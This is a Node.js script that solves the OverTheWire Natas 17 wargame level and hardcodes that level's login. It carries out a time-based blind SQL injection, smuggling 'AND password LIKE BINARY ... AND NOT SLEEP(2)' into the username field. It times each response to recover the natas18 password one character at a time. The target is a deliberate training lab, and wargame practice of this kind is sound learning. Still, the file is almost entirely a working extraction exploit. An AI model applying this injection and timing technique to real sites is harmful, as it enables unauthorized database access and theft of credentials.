const http = require('http');
const querystring = require('querystring');

const toMillis = ([s, ns]) => s * 1000 + Math.floor(ns / 1000000);

const submit = text =>
  new Promise((resolve, reject) => {
    let time = process.hrtime();

    const request = http.request(
      {
        auth: 'natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        hostname: 'natas17.natas.labs.overthewire.org',
        method: 'POST',
        path: '/index.php',
        port: 80,
      },
      res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => {
          const timePassed = toMillis(process.hrtime(time));
          // console.log(`For '${text} time ${timePassed}'`);
          const didSleep = timePassed > 1000;
          resolve(didSleep);
        });
      },
    );

    // const username = `nick"
    //   UNION ALL
    //   SELECT *
    //   FROM users
    //   WHERE username
    //     LIKE BINARY '${text}'
    //     AND NOT SLEEP(1) -- `;

    const username = `natas18"
      AND password LIKE BINARY '${text}'
      AND NOT SLEEP(2)
      -- `;

    request.on('error', e => console.log(e));
    request.write(querystring.stringify({username}));
    request.end();
  });

const containsText = text => submit(`%${text}%`);
const startsWithText = text => submit(`${text}%`);

let characters = [
  ...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
];

const filter = ([c, ...cs], func = containsText) =>
  (cs.length ? filter(cs, func) : Promise.resolve([])).then(rest =>
    func(c).then(p => (p ? [c, ...rest] : rest)),
  );

const find = ([t, ...ts], func = startsWithText) =>
  t ? func(t).then(p => (p ? t : find(ts))) : Promise.reject();

const findNext = characters => text => find(characters.map(c => text + c));

const findAll = characters => text =>
  findNext(characters)(text)
    .then(t => (console.log(`Found: ${t}`), t))
    .then(findAll(characters))
    .catch(() => text);

filter(characters)
  .then(cs => findAll(cs)(''))
  .then(password => console.log(`\nPassword:\n${password}`))
  .catch(() => console.log('Error!'));
